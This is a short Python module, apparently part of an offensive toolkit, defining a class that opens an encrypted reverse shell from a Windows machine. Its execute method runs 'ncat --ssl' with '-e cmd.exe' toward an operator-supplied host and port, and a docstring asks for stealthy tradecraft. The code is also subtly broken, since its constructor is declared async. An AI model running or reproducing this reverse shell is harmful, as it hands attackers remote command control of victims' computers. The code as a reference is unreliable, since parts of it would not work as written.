from __future__ import annotations

from rich.console import Console
from ..exec import WindowsCommandExecutor
import os

class EncryptedShellReverseTCP(WindowsCommandExecutor):
    """
    A class that will execute a reverse shell on a Windows system.
    """
    async def __init__(self, console: Console, lhost: str, lport: int):
        self.lhost: str = lhost
        self.lport: int = lport
        console.print(f"Starting encrypted reverse shell to {lhost}:{lport}")

    async def help(self, console: Console) -> None:
        """
        Display help information for the command.
        """
        console.print("This command starts an encrypted reverse shell to a specified host and port.")
        #console.print("Usage: encrypted_shell_reverse_tcp <lhost> <lport>")
        #console.print("Example: encrypted_shell_reverse_tcp <lhost> <lport>")
        
        
    async def execute(self, console: Console, command: str) -> None:
        '''
        Execute the command on the Windows host. Optimize the command for stealth where possible, using progressively advanced TTPs.
        
        '''
        console.print(f"Starting encrypted reverse shell to {self.lhost}:{self.lport}")
        try:
            # Execute the command using os.system
            
            """
            Alright, let's be real....
            this is a DOGSHIT way to start a reverse shell. We need to come back to this later.
            """
            console.print(f"Starting reverse shell to {self.lhost}:{self.lport}")
            os.system(f"ncat --ssl {self.lhost} {self.lport} -e cmd.exe")
            console.print(f"Reverse shell started successfully.")
        except Exception as e:
            # Handle any exceptions that occur during command execution
            console.print(f"Error starting reverse shell: {e}")

            